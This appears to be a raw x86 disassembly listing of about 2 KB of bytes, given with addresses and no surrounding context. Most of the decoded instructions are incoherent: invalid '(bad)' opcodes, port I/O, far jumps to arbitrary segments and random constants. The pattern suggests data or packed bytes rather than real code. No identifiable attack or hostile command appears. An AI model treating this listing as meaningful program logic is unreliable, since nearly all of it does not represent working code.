  4171d3:	cmp    eax,0x5cd5751
  4171d8:	fwait
  4171d9:	sar    BYTE PTR [esi+ecx*4+0x7516e4f0],cl
  4171e0:	data16 xor BYTE PTR ds:0x4db6ca2,0x17
  4171e8:	sahf   
  4171e9:	xchg   esp,eax
  4171ea:	mov    dh,0x9
  4171ec:	dec    esi
  4171ed:	add    eax,0x971c0a1d
  4171f2:	jge    0x4171ca
  4171f4:	clc    
  4171f5:	std    
  4171f6:	adc    DWORD PTR [esi],0x27a00fae
  4171fc:	dec    eax
  4171fd:	retf   0x263f
  417200:	sub    eax,0xb3630de4
  417205:	gs jecxz 0x4171bc
  417208:	out    dx,eax
  417209:	mov    bh,0xcd
  41720b:	lods   eax,DWORD PTR ds:[esi]
  41720c:	jg     0x4171f4
  41720e:	xchg   edx,eax
  41720f:	test   eax,0xfe255112
  417214:	sti    
  417215:	inc    edi
  417216:	xor    DWORD PTR [edx-0x263514c5],ecx
  41721c:	pushf  
  41721d:	cmc    
  41721e:	out    dx,al
  41721f:	test   DWORD PTR [edi-0xa065440],ebx
  417225:	lds    edx,FWORD PTR [ebp+0x3c]
  417228:	cwde   
  417229:	cdq    
  41722a:	mov    ah,0xb6
  41722c:	and    DWORD PTR [ecx+edi*1+0x45],edx
  417230:	add    DWORD PTR [edx-0x26f95d04],edi
  417236:	mov    BYTE PTR es:[ecx-0x18],dl
  41723a:	mov    BYTE PTR [edi+0x604db3d],ah
  417240:	nop
  417241:	sbb    eax,0xeb960cab
  417246:	xor    eax,0xd6bf73f3
  41724b:	jl     0x4171d9
  41724d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41724e:	ss int3 
  417250:	adc    edi,DWORD PTR [ebx]
  417252:	sub    DWORD PTR [edx-0x6e],eax
  417255:	xor    eax,DWORD PTR [eax]
  417257:	inc    esi
  417258:	sbb    al,0x9
  41725a:	mov    edx,0x9b4ab95f
  41725f:	outs   dx,DWORD PTR ds:[esi]
  417260:	and    BYTE PTR [eax+0x32dcd936],dl
  417266:	daa    
  417267:	rcr    DWORD PTR [edi],1
  417269:	out    0x46,eax
  41726b:	pop    ss
  41726c:	mov    eax,ds:0x97d59665
  417271:	dec    eax
  417272:	xchg   edi,eax
  417273:	fisub  WORD PTR [eax+0x728c8530]
  417279:	cmc    
  41727a:	pop    ecx
  41727b:	out    0x2e,eax
  41727d:	idiv   BYTE PTR [edx-0x177891dc]
  417283:	pop    esp
  417284:	mov    ?,WORD PTR [eax+edi*8-0x44]
  417288:	inc    esi
  417289:	aad    0x5a
  41728b:	repz pusha 
  41728d:	das    
  41728e:	cmp    BYTE PTR ds:0x8686328f,dl
  417294:	addr16 mov bh,0xfc
  417297:	ins    BYTE PTR es:[edi],dx
  417298:	jmp    0xb2df:0x316f8aef
  41729f:	push   esp
  4172a0:	shl    DWORD PTR [ebp-0x6],1
  4172a3:	and    BYTE PTR [edx],cl
  4172a5:	add    al,bl
  4172a7:	ret    0x2da0
  4172aa:	add    BYTE PTR [eax],al
  4172ac:	and    DWORD PTR [esi-0x26],0xc76d45e8
  4172b3:	sbb    ebx,eax
  4172b5:	pop    edx
  4172b6:	cdq    
  4172b7:	mov    edi,0xd4cf3e74
  4172bc:	pop    esi
  4172bd:	stc    
  4172be:	stos   DWORD PTR es:[edi],eax
  4172bf:	dec    esp
  4172c0:	sbb    DWORD PTR [eax+ecx*4-0x7e6784e2],esp
  4172c7:	pop    ebx
  4172c8:	call   0x11fb:0xac7698c5
  4172cf:	test   al,0x1e
  4172d1:	adc    eax,0x41ae58b6
  4172d6:	fldcw  WORD PTR [eax]
  4172d8:	pop    ebp
  4172d9:	in     eax,dx
  4172da:	clc    
  4172db:	push   ebp
  4172dc:	jmp    0x417324
  4172de:	call   0xd8916c8b
  4172e3:	and    DWORD PTR [eax+0x59d4dfd0],esi
  4172e9:	jo     0x4172be
  4172eb:	adc    BYTE PTR [ecx],0xe0
  4172ee:	inc    eax
  4172ef:	adc    DWORD PTR [ebx+0x5566a4d0],0x3919f519
  4172f9:	ins    BYTE PTR es:[edi],dx
  4172fa:	imul   eax,DWORD PTR [esi-0x4e10cb66],0x1077b3b1
  417304:	das    
  417305:	or     bl,BYTE PTR [edi]
  417307:	(bad)  
  417308:	dec    edi
  417309:	inc    ebp
  41730a:	mov    al,0x7d
  41730c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41730d:	xchg   BYTE PTR [edi],dh
  41730f:	mov    cl,0x85
  417311:	add    eax,0x3c1dac15
  417316:	and    DWORD PTR [ebp+0x26],esp
  417319:	fist   DWORD PTR [ebp+ebx*2+0x5a]
  41731d:	jge    0x417324
  41731f:	mov    esi,0xb119adb4
  417324:	push   edx
  417325:	mov    edx,0xb04536f8
  41732a:	cld    
  41732b:	xchg   ebx,eax
  41732c:	cwde   
  41732d:	or     ah,BYTE PTR [eax+esi*4]
  417330:	mov    eax,0xf9fe8257
  417335:	shl    BYTE PTR [ecx+0x60],0xf4
  417339:	mov    ecx,0xf0b94140
  41733e:	pop    ebp
  41733f:	dec    esi
  417340:	and    al,0xb
  417342:	neg    BYTE PTR [ecx-0x2fdd0dc6]
  417348:	jge    0x4172dc
  41734a:	add    BYTE PTR [eax],dl
  41734c:	push   0xc265a847
  417351:	lahf   
  417352:	enter  0x6418,0x2c
  417356:	mov    esp,0x3c2c804f
  41735b:	add    ah,BYTE PTR [edi+0x5aa1af1f]
  417361:	adc    eax,0xaf88336b
  417366:	popf   
  417367:	pop    ecx
  417368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417369:	cwde   
  41736a:	push   cs
  41736b:	xor    dh,BYTE PTR [esi+0x14e40ae3]
  417371:	adc    ebx,esp
  417373:	loop   0x417340
  417375:	sub    esp,eax
  417377:	stc    
  417378:	mov    ch,0xf1
  41737a:	xor    DWORD PTR [ebp+0x52709c0b],ebp
  417380:	in     eax,0xa8
  417382:	test   BYTE PTR [ecx+0x3c],0xf2
  417386:	xor    ecx,DWORD PTR [edx]
  417388:	rol    DWORD PTR [eax],0x36
  41738b:	pop    ebp
  41738c:	pop    ss
  41738d:	jge    0x4173ca
  41738f:	(bad)  
  417390:	jp     0x4173b8
  417392:	push   eax
  417393:	or     eax,0x26eddaf
  417398:	cmp    DWORD PTR ds:0xcc6cdc4,ebx
  41739e:	(bad)  
  41739f:	(bad)  ds:0xe4411e9
  4173a5:	leave  
  4173a6:	add    al,0x5e
  4173a8:	mov    cl,0x8a
  4173aa:	xchg   ebp,eax
  4173ab:	add    eax,DWORD PTR [esi]
  4173ad:	pop    edi
  4173ae:	dec    ecx
  4173af:	jo     0x417418
  4173b1:	in     al,dx
  4173b2:	sbb    al,0x14
  4173b4:	cmp    al,0x74
  4173b6:	and    eax,0x67f813d7
  4173bb:	or     esi,DWORD PTR [ebx+0x7b]
  4173be:	or     al,0x74
  4173c0:	or     eax,0xeb9c0ab7
  4173c5:	pop    ecx
  4173c6:	cmp    BYTE PTR [eax-0x24],dh
  4173c9:	aam    0x48
  4173cb:	in     eax,0x8d
  4173cd:	jmp    0xf58a:0x4d91ebc8
  4173d4:	ja     0x417426
  4173d6:	dec    esi
  4173d7:	loopne 0x4173f8
  4173d9:	pushf  
  4173da:	(bad)  
  4173dc:	cmp    eax,0xcad22379
  4173e1:	cmp    ecx,DWORD PTR [esi-0x2d4dd906]
  4173e7:	add    eax,0x5a3c98b2
  4173ec:	mov    ebx,0x408a1cde
  4173f1:	sti    
  4173f2:	jne    0x41737f
  4173f4:	jne    0x4173f1
  4173f6:	ret    0x5143
  4173f9:	popf   
  4173fa:	shl    DWORD PTR [eax-0x5bb74c5d],0x39
  417401:	in     eax,0xab
  417403:	xchg   dh,bl
  417405:	in     eax,0x8b
  417407:	adc    al,BYTE PTR [edx]
  417409:	sub    DWORD PTR [ecx],ebx
  41740b:	mov    dl,0xf1
  41740d:	mov    DWORD PTR [ecx+ebx*8+0x10db43c1],edi
  417414:	mov    dh,0xac
  417416:	sbb    al,0x15
  417418:	fild   QWORD PTR [edi-0x58becfec]
  41741e:	dec    ebp
  41741f:	or     DWORD PTR [eax+edx*2+0x62456891],0x21
  417427:	cmp    DWORD PTR [eax],0xffffffc3
  41742a:	arpl   WORD PTR [esi+0x3a],si
  41742d:	test   DWORD PTR [eax+0x1174d268],edx
  417433:	pop    esp
  417434:	pop    es
  417435:	inc    esi
  417436:	xchg   ebp,eax
  417437:	jecxz  0x41744f
  417439:	push   edi
  41743a:	jo     0x4174aa
  41743c:	dec    esi
  41743d:	pushf  
  41743e:	xchg   ebx,eax
  41743f:	aam    0x46
  417441:	lea    edx,[edi+0x1f]
  417444:	lds    ecx,FWORD PTR [esi]
  417446:	scas   al,BYTE PTR es:[edi]
  417447:	jmp    0x417459
  417449:	fimul  WORD PTR ds:0xecbd924d
  41744f:	inc    BYTE PTR [ebx+eax*1-0xd]
  417453:	aaa    
  417454:	sbb    ch,cl
  417456:	cmp    DWORD PTR [ebx+0x52ac8b06],esi
  41745c:	push   ecx
  41745d:	call   0x41df90
  417462:	mov    eax,DWORD PTR [esi]
  417464:	mov    ecx,DWORD PTR [esi+0x4]
  417467:	shrd   eax,ecx,0x2
  41746b:	shr    ecx,0x2
  41746e:	shr    edx,0x1e
  417471:	xor    ecx,0xe702a276
  417477:	jmp    0x417a01
  41747c:	repnz fadd DWORD PTR [eax-0xd9b9f7c]
  417483:	pop    eax
  417484:	loop   0x417458
  417486:	fsubr  DWORD PTR [eax+0x6824eca4]
  41748c:	fimul  WORD PTR [edi+0x43d160c]
  417492:	push   ss
  417493:	push   ss
  417494:	jnp    0x4174fc
  417496:	stos   DWORD PTR es:[edi],eax
  417497:	push   ds
  417498:	pop    ebx
  417499:	(bad)  
  41749a:	fiadd  WORD PTR [edx+ebx*8]
  41749d:	retf   
  41749e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41749f:	outs   dx,DWORD PTR ds:[esi]
  4174a0:	pop    ecx
  4174a1:	not    DWORD PTR [edx+0x6a]
  4174a4:	push   cs
  4174a5:	jne    0x4174e5
  4174a7:	js     0x417470
  4174a9:	sub    bh,BYTE PTR [eax]
  4174ab:	xchg   edi,eax
  4174ac:	pmaddwd mm1,mm2
  4174af:	mov    DWORD PTR [edi+edx*1-0x3c],ebx
  4174b3:	(bad)  
  4174b5:	jnp    0x4174a3
  4174b7:	mov    bh,0x7b
  4174b9:	and    esi,DWORD PTR [edi+0x36]
  4174bc:	into   
  4174bd:	cmp    edi,edi
  4174bf:	dec    eax
  4174c0:	retf   
  4174c1:	cmp    ebp,DWORD PTR [edx-0x57]
  4174c4:	nop
  4174c5:	dec    ebp
  4174c6:	(bad)  
  4174c8:	sbb    eax,0x9a07f905
  4174cd:	inc    ecx
  4174ce:	pop    edx
  4174cf:	mov    al,ds:0x6d8c813d
  4174d4:	adc    esp,DWORD PTR ds:0x5d586c03
  4174da:	mov    ah,0x1e
  4174dc:	push   edi
  4174dd:	dec    ebx
  4174de:	fidivr DWORD PTR [ebx-0x18]
  4174e1:	mov    ch,BYTE PTR [ebp-0x7]
  4174e4:	add    DWORD PTR [edi+0x283d5ea6],esi
  4174ea:	out    0xd1,eax
  4174ec:	icebp  
  4174ed:	xchg   esi,eax
  4174ee:	retf   0xf906
  4174f1:	imul   edx,DWORD PTR es:[edx+ecx*1+0x62],0x5c1854b5
  4174fa:	add    al,0xe8
  4174fc:	mov    bl,0xa8
  4174fe:	sbb    al,0x88
  417500:	and    ecx,DWORD PTR [eax+0x538025c6]
  417506:	pop    ebp
  417507:	popa   
  417508:	fldcw  WORD PTR [esi-0x7dc0831c]
  41750e:	xor    BYTE PTR [esi+0x19],0xae
  417512:	fwait
  417513:	xor    eax,0x61546918
  417518:	push   ebx
  417519:	and    eax,0x1a76559b
  41751e:	aas    
  41751f:	push   DWORD PTR [ebp+0x3a]
  417522:	pop    ss
  417523:	pop    ecx
  417524:	push   es
  417525:	pop    esi
  417526:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417527:	sbb    al,0x1a
  417529:	adc    DWORD PTR [esi-0x3e],ebp
  41752c:	hlt    
  41752d:	nop
  41752e:	push   eax
  41752f:	es imul ebx,ebx,0xffffffb5
  417533:	mov    ecx,esi
  417535:	sbb    DWORD PTR [edx],ebp
  417537:	int3   
  417538:	add    dl,dl
  41753a:	lods   al,BYTE PTR ds:[esi]
  41753b:	sub    al,BYTE PTR [ebx]
  41753d:	xchg   edi,eax
  41753e:	scas   al,BYTE PTR es:[edi]
  41753f:	(bad)  
  417540:	sub    ah,bl
  417542:	fs push esp
  417544:	mov    dl,bh
  417546:	cmp    al,BYTE PTR [eax]
  417548:	test   DWORD PTR [esi-0x5839e94f],0x26e6dd20
  417552:	ins    DWORD PTR es:[edi],dx
  417553:	fstp   QWORD PTR [ecx+0x60]
  417556:	mov    edx,0x8a114a88
  41755b:	imul   esi,esi,0xffffffbe
  41755e:	sar    BYTE PTR [edi+0x738a79d5],0x77
  417565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417566:	mov    esi,0x798ba90
  41756b:	pop    ebp
  41756c:	mov    eax,0x603e89c2
  417571:	push   ss
  417572:	repz popa 
  417574:	jae    0x417519
  417576:	dec    ebp
  417577:	inc    esp
  417578:	sub    al,0x48
  41757a:	fadd   st(0),st
  41757c:	loope  0x41753e
  41757e:	(bad)  
  41757f:	fsubrp st(2),st
  417581:	popf   
  417582:	in     eax,dx
  417583:	push   ss
  417584:	or     eax,0x4055faf3
  417589:	inc    eax
  41758a:	adc    bh,BYTE PTR [edx+0xb]
  41758d:	iret   
  41758e:	jecxz  0x417588
  417590:	push   es
  417591:	sbb    ch,BYTE PTR ds:0x9b1dc3d4
  417597:	in     eax,0x2b
  417599:	bound  ebp,QWORD PTR [ecx+0x56]
  41759c:	jl     0x41761d
  41759e:	lahf   
  41759f:	ret    0xabb1
  4175a2:	loope  0x41754b
  4175a4:	mov    ecx,0x3703f968
  4175a9:	inc    edi
  4175aa:	shr    DWORD PTR [edx],1
  4175ac:	jmp    0x239d:0xf8c07524
  4175b3:	xchg   ebp,eax
  4175b4:	push   es
  4175b5:	and    eax,0x2c90d67d
  4175ba:	xchg   esp,eax
  4175bb:	(bad)  
  4175bc:	or     BYTE PTR [edi],dl
  4175be:	std    
  4175bf:	xor    BYTE PTR [ebp+0x17],ch
  4175c2:	push   0xffffffa8
  4175c4:	test   ah,bl
  4175c6:	adc    al,0x9c
  4175c8:	pushf  
  4175c9:	stos   BYTE PTR es:[edi],al
  4175ca:	mov    eax,ds:0xfaed92a4
  4175cf:	push   ss
  4175d0:	inc    ecx
  4175d1:	dec    esp
  4175d2:	jp     0x4175e0
  4175d4:	add    DWORD PTR [edx+0x17c91173],ecx
  4175da:	fs xchg ebx,eax
  4175dc:	jbe    0x4175e9
  4175de:	mov    edx,0x4c8fe000
  4175e3:	adc    dl,BYTE PTR [edi-0x4c]
  4175e6:	ins    BYTE PTR es:[edi],dx
  4175e7:	in     eax,0x62
  4175e9:	rcl    BYTE PTR [ecx-0x37],1
  4175ec:	mov    ebp,0xcfa8936e
  4175f1:	test   eax,0x34c46d3f
  4175f6:	popf   
  4175f7:	(bad)  
  4175f8:	push   edx
  4175f9:	jne    0x417614
  4175fb:	xchg   ecx,eax
  4175fc:	mov    al,0xe
  4175fe:	pop    esp
  4175ff:	and    BYTE PTR [ebp+edx*4-0x51],bh
  417603:	clc    
  417604:	push   ebp
  417605:	sbb    al,dh
  417607:	lahf   
  417608:	and    ebp,DWORD PTR [ecx-0x70]
  41760b:	or     edi,DWORD PTR [eax-0x335b7f45]
  417611:	aas    
  417612:	rol    DWORD PTR [edi-0x490837c8],cl
  417618:	fidiv  WORD PTR [eax+0x69]
  41761b:	fstp   TBYTE PTR [eax-0x44]
  41761e:	popf   
  41761f:	lea    edi,ds:0x514f95c0
  417625:	xor    eax,0xd7e090a9
  41762a:	fwait
  41762b:	not    DWORD PTR [ecx]
  41762d:	popa   
  41762e:	dec    esp
  41762f:	mov    edx,0x2490037f
  417634:	(bad)  
  417635:	jl     0x41767b
  417637:	test   DWORD PTR [ebx+0x1fc00d23],ebx
  41763d:	retf   0x4507
  417640:	mov    al,ds:0x9d971fe5
  417645:	jle    0x417612
  417647:	les    esi,FWORD PTR [ebp+0xd]
  41764a:	bound  edx,QWORD PTR [ebx+0x1fe756b5]
  417650:	aam    0x72
  417652:	cmp    al,0xdc
  417654:	clc    
  417655:	push   edx
  417656:	push   es
  417657:	mov    al,0x99
  417659:	dec    eax
  41765a:	adc    ax,0x480c
  41765e:	aam    0x5d
  417660:	jle    0x4175fc
  417662:	inc    eax
  417663:	in     al,dx
  417664:	lods   al,BYTE PTR ds:[esi]
  417665:	pop    ebp
  417666:	out    dx,eax
  417667:	mov    esi,0xfebb3951
  41766c:	sar    DWORD PTR [edx+0x2b02c845],cl
  417672:	call   0x22cb:0xe84ccc68
  417679:	test   eax,0xfa076928
  41767e:	popf   
  41767f:	add    ah,BYTE PTR [esi-0x4d]
  417682:	mov    dl,0x60
  417684:	mov    ah,0xe8
  417686:	cmp    eax,0xaca228e3
  41768b:	pop    eax
  41768c:	and    DWORD PTR [edx+0x789ba359],ebx
  417692:	pop    eax
  417693:	int    0x74
  417695:	lods   al,BYTE PTR ds:[esi]
  417696:	(bad)  [ecx+0x1d8c9fd8]
  41769c:	mov    ebx,0xf9634989
  4176a1:	lods   al,BYTE PTR ds:[esi]
  4176a2:	mov    WORD PTR [eax],gs
  4176a4:	or     esi,DWORD PTR [eax+edx*1+0x67eb3fe6]
  4176ab:	dec    edi
  4176ac:	sti    
  4176ad:	outs   dx,BYTE PTR ds:[esi]
  4176ae:	sbb    edx,DWORD PTR [ebx]
  4176b0:	mov    ss,WORD PTR [esi+0x1c7765ce]
  4176b6:	ins    DWORD PTR es:[edi],dx
  4176b7:	data16 jne 0x41769d
  4176ba:	adc    bh,dl
  4176bc:	sub    BYTE PTR ds:0x4beab044,al
  4176c2:	mov    dh,BYTE PTR es:[edi]
  4176c5:	ins    DWORD PTR es:[edi],dx
  4176c6:	jg     0x4176b6
  4176c8:	inc    ecx
  4176c9:	push   edx
  4176ca:	popf   
  4176cb:	push   ebx
  4176cc:	jnp    0x41767b
  4176ce:	shr    BYTE PTR [edx],1
  4176d0:	jbe    0x41767e
  4176d2:	into   
  4176d3:	mov    ds:0x21991949,eax
  4176d8:	icebp  
  4176d9:	ss sub ebp,ebx
  4176dc:	mov    dl,0xef
  4176de:	push   0xeea1f6ef
  4176e3:	lds    ebx,FWORD PTR [esi-0x4db85d54]
  4176e9:	cmp    al,0xc3
  4176eb:	ret    
  4176ec:	leave  
  4176ed:	add    ebx,DWORD PTR [eax+edx*1+0x5c]
  4176f1:	lods   al,BYTE PTR ds:[esi]
  4176f2:	ss inc edx
  4176f4:	dec    ecx
  4176f5:	or     DWORD PTR [ebp-0x58e6e8e9],ebx
  4176fb:	call   0xae30372c
  417700:	adc    BYTE PTR fs:[esi-0x20],cl
  417704:	outs   dx,BYTE PTR ds:[esi]
  417705:	lods   eax,DWORD PTR ds:[esi]
  417706:	mov    dl,0x3d
  417708:	imul   ebp,ebx,0xfffffffe
  41770b:	fcmovb st,st(3)
  41770d:	xor    bh,BYTE PTR [edx]
  41770f:	or     BYTE PTR ds:0xffff87f3,al
  417715:	dec    ecx
  417716:	ret    
  417717:	push   0x57
  417719:	ins    BYTE PTR es:[edi],dx
  41771a:	nop    ebx
  41771d:	idiv   DWORD PTR [esi+0x775a288b]
  417723:	dec    esp
  417724:	sub    esi,DWORD PTR [ebx+0x5384a7a9]
  41772a:	mov    dl,0x85
  41772c:	ss fsubr st(7),st
  41772f:	mov    esi,DWORD PTR [eax]
  417731:	mov    ebp,esp
  417733:	in     al,dx
  417734:	mov    ecx,DWORD PTR [esi+0x2c6a6546]
  41773a:	adc    al,0x78
  41773c:	mov    cl,al
  41773e:	mov    ebp,0x30a706e9
  417743:	inc    eax
  417744:	retf   
  417745:	test   DWORD PTR [eax-0x627da47f],0x242923bf
  41774f:	mov    ebx,0xc3395e7a
  417754:	mov    ebp,0x5972e729
  417759:	adc    edi,DWORD PTR [ebp+0x67ef3d55]
  41775f:	mov    ds:0x9699cb6,al
  417764:	outs   dx,DWORD PTR ds:[esi]
  417765:	in     eax,0x73
  417767:	(bad)  [edx+eiz*2+0x306c376f]
  41776e:	aam    0xfe
  417770:	jp     0x41777c
  417772:	(bad)  
  417773:	cli    
  417774:	and    BYTE PTR [ecx+edx*8+0x4e72647c],0xe4
  41777c:	jl     0x4177a8
  41777e:	retf   
  41777f:	add    BYTE PTR [esi],bh
  417781:	mov    ch,0xb3
  417783:	sti    
  417784:	sti    
  417785:	test   dl,ah
  417787:	cmp    al,BYTE PTR cs:[edi]
  41778a:	fucom  st(6)
  41778c:	not    eax
  41778e:	add    edi,DWORD PTR [ebx]
  417790:	ret    
  417791:	pop    esi
  417792:	inc    eax
  417793:	jb     0x41776f
  417795:	(bad)  
  417796:	xlat   BYTE PTR ds:[bx]
  417798:	add    ecx,DWORD PTR [esi+edi*1-0x58]
  41779c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41779d:	in     eax,0xaf
  41779f:	xlat   BYTE PTR ds:[ebx]
  4177a0:	addr16 retf 
  4177a2:	jae    0x41780a
  4177a4:	adc    dh,bh
  4177a6:	sbb    ch,BYTE PTR [edx]
  4177a8:	icebp  
  4177a9:	imul   ecx,DWORD PTR [edi],0x3c
  4177ac:	addr16 xchg ebx,eax
  4177ae:	jecxz  0x417809
  4177b0:	dec    ebx
  4177b1:	cdq    
  4177b2:	mov    eax,0xb4cec616
  4177b7:	jnp    0x417788
  4177b9:	lds    ebx,FWORD PTR [ebx+0x4234def2]
  4177bf:	push   cs
  4177c0:	scas   al,BYTE PTR es:[edi]
  4177c1:	and    DWORD PTR [esi],edi
  4177c3:	icebp  
  4177c4:	cmp    eax,ebp
  4177c6:	or     al,0xcd
  4177c8:	push   ss
  4177c9:	call   0x377c:0x74d98f97
  4177d0:	jns    0x4177f4
  4177d2:	test   dh,ch
  4177d4:	push   DWORD PTR [ecx+0x4a]
  4177d7:	mov    cl,BYTE PTR [eax+0x2]
  4177da:	sbb    eax,0xc3bdf2f5
  4177df:	pop    ecx
  4177e0:	ins    DWORD PTR es:[edi],dx
  4177e1:	inc    esi
  4177e2:	les    ebx,FWORD PTR [edi]
  4177e4:	(bad)  
  4177e5:	mov    al,ds:0x1037c08b
  4177ea:	push   es
  4177eb:	mov    dl,BYTE PTR [ebp-0x65ab890f]
  4177f1:	push   0x8f23aae9
  4177f6:	jnp    0x41785a
  4177f8:	sar    BYTE PTR ds:0x2615f918,1
  4177fe:	jecxz  0x4177e4
  417800:	sahf   
  417801:	cmp    ah,BYTE PTR [edi+0x40]
  417804:	add    BYTE PTR [ecx+0x3e1fdfdd],ah
  41780a:	add    ecx,DWORD PTR gs:[edi-0x6f5b3092]
  417811:	test   BYTE PTR [esi+0x25],0xa7
  417815:	sbb    bh,BYTE PTR [edx+0xc96891b]
  41781b:	and    eax,0xb0cfc1dd
  417820:	add    edi,edi
  417822:	stos   DWORD PTR es:[edi],eax
  417823:	sub    cl,dh
  417825:	fcmovnu st,st(3)
  417827:	sbb    edx,DWORD PTR [edx-0x455338db]
  41782d:	pop    es
  41782e:	push   eax
  41782f:	cdq    
  417830:	inc    esi
  417831:	jl     0x4177bb
  417833:	les    edx,FWORD PTR [edi]
  417835:	mov    bl,0x18
  417837:	imul   ebp,DWORD PTR [eax],0xffffffab
  41783a:	sbb    bl,bl
  41783c:	adc    eax,0xb769353d
  417841:	in     al,dx
  417842:	pusha  
  417843:	loop   0x4178ad
  417845:	sti    
  417846:	clc    
  417847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417848:	jne    0x417835
  41784a:	les    esi,FWORD PTR [edi+esi*8]
  41784d:	or     al,0xb6
  41784f:	(bad)  
  417850:	xor    eax,edi
  417852:	xor    cl,cl
  417854:	sub    DWORD PTR [edx],ebp
  417856:	dec    eax
  417857:	inc    edx
  417858:	add    al,0x7
  41785a:	sbb    DWORD PTR [ebx],esi
  41785c:	loope  0x417826
  41785e:	fstp   DWORD PTR [edi-0x6a]
  417861:	popf   
  417862:	add    eax,0x111e720b
  417867:	les    eax,FWORD PTR [esi+0x2832f5d7]
  41786d:	wrmsr  
  41786f:	(bad)  
  417871:	cmp    eax,DWORD PTR [ebx+eiz*1]
  417874:	ret    0x2fa1
  417877:	dec    ecx
  417878:	adc    ch,ch
  41787a:	mov    ebp,0xe2c32138
  41787f:	mov    es,WORD PTR [edx-0x60]
  417882:	mov    dl,0x96
  417884:	mov    bh,0x35
  417886:	jp     0x4178fe
  417888:	mov    ds:0x15e84403,eax
  41788d:	push   edi
  41788e:	pop    ebp
  41788f:	cmp    DWORD PTR [edi],esp
  417891:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417892:	mov    fs,WORD PTR [edx+0x51]
  417895:	add    eax,0xa390e4b1
  41789a:	pop    ebp
  41789b:	adc    BYTE PTR [edi-0x4b],ah
  41789e:	and    ebp,DWORD PTR [eax+0x65e5d6f1]
  4178a4:	lods   eax,DWORD PTR ds:[esi]
  4178a5:	xchg   edi,eax
  4178a6:	lods   al,BYTE PTR ds:[esi]
  4178a7:	(bad)  
  4178a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178a9:	imul   ecx,DWORD PTR [eax+ecx*2+0x2bee2396],0xfcdd0cf4
  4178b4:	jmp    0x417875
  4178b6:	aad    0x2f
  4178b8:	sti    
  4178b9:	arpl   WORD PTR [ebp-0x582e1d4e],di
  4178bf:	inc    edx
  4178c0:	fadd   QWORD PTR [esi+0x2a8aae74]
  4178c6:	cmp    cl,al
  4178c8:	loopne 0x417919
  4178ca:	jo     0x4178a5
  4178cc:	jge    0x417859
  4178ce:	sbb    eax,DWORD PTR [ebp-0x7a]
  4178d1:	pop    ds
  4178d2:	jg     0x4178c5
  4178d4:	(bad)  
  4178d5:	imul   BYTE PTR [ebp-0x62338e05]
  4178db:	sbb    eax,0x2fcd669e
  4178e0:	sub    al,0x69
  4178e2:	mov    ebp,DWORD PTR [eax-0x6f3363d8]
  4178e8:	ror    BYTE PTR [ebp-0x313e68ac],cl
  4178ee:	inc    ecx
  4178ef:	pop    edi
  4178f0:	imul   ecx,DWORD PTR [esp+edi*2-0x653feca9],0x13212d54
  4178fb:	das    
  4178fc:	imul   ebx,DWORD PTR [eax],0x6e486a9a
  417902:	int    0xf5
  417904:	sub    DWORD PTR [ecx-0x40],eax
  417907:	cmp    cl,dl
  417909:	(bad)  
  41790a:	clc    
  41790b:	retf   
  41790c:	sbb    ch,bh
  41790e:	lea    esp,[edx]
  417910:	scas   al,BYTE PTR es:[edi]
  417911:	mov    al,ds:0x2e82de24
  417916:	les    eax,FWORD PTR ds:0x9fb516d1
  41791c:	(bad)  
  41791d:	and    eax,DWORD PTR [eax]
  41791f:	imul   edi,edi,0x67
  417922:	fldenv [eax-0x641c1d22]
  417928:	fst    QWORD PTR [ecx-0x41]
  41792b:	into   
  41792c:	sub    DWORD PTR [ebx+0x7976e663],ebp
  417932:	out    dx,eax
  417933:	and    dh,BYTE PTR [ebx]
  417935:	scas   eax,DWORD PTR es:[edi]
  417936:	xchg   DWORD PTR [edx+0x15c295e7],edx
  41793c:	or     DWORD PTR [edx+eax*1],esi
  41793f:	call   0x7a28:0xbc64b49a
  417946:	sub    BYTE PTR [ecx],0x65
  417949:	and    dl,BYTE PTR [ebx-0x22ccba50]
  41794f:	adc    al,dh
  417951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417952:	dec    edx
  417953:	adc    eax,0xc09d35bd
  417958:	and    dh,al
  41795a:	inc    eax
  41795b:	sbb    eax,0xf0c92da4
  417960:	or     BYTE PTR [eax+0x68],0xd0
  417964:	add    BYTE PTR [edi-0x749125e],bl
  41796a:	hlt    
  41796b:	dec    eax
  41796c:	pop    eax
  41796d:	iret   
  41796e:	adc    DWORD PTR [esi-0x69],ebx
  417971:	call   0x2c383b60
  417976:	lds    edx,FWORD PTR ds:0x27477084
  41797c:	mov    ebp,0x995ee130
  417981:	adc    al,0x48
  417983:	sub    ecx,ecx
  417985:	xor    ch,0x1f
  417988:	xor    DWORD PTR [eax+0x4],edx
  41798b:	fnstsw WORD PTR [edi]
  41798d:	retf   0x1b70
  417990:	(bad)  
  417991:	test   DWORD PTR [ebx],0x76a84fb
  417997:	jmp    0xa780:0x695791cc
  41799e:	call   0xcaa8ef02
  4179a3:	and    DWORD PTR [edx],edx
  4179a5:	repz (bad) 
  4179a7:	nop
  4179a8:	loope  0x4179a9
  4179aa:	lahf   
  4179ab:	mov    ds:0x1a25af2b,al
  4179b0:	mov    eax,ds:0xd9f22264
  4179b5:	dec    ebp
  4179b6:	repz jne 0x4179a5
  4179b9:	inc    esi
  4179ba:	lock sar BYTE PTR [edi+0x6d],0xa1
  4179bf:	xchg   ecx,eax
  4179c0:	jl     0x4179d5
  4179c2:	das    
  4179c3:	jnp    0x41798e
  4179c5:	mov    al,ds:0x18cee9c0
  4179ca:	mov    DWORD PTR [eax],ebp
  4179cc:	repnz mov ah,0x88
  4179cf:	mov    dh,cl
  4179d1:	mov    edi,0x69bcdf68
  4179d6:	add    BYTE PTR [ebx-0x30],0x2b
  4179da:	add    BYTE PTR [ecx+0xd],0x0
  4179de:	push   cs
  4179df:	lods   eax,DWORD PTR ds:[esi]
  4179e0:	or     DWORD PTR [ebx-0x51],eax
  4179e3:	xor    edi,DWORD PTR [edi]
  4179e5:	outs   dx,DWORD PTR ds:[esi]
  4179e6:	cwde   
  4179e7:	lods   al,BYTE PTR ds:[esi]
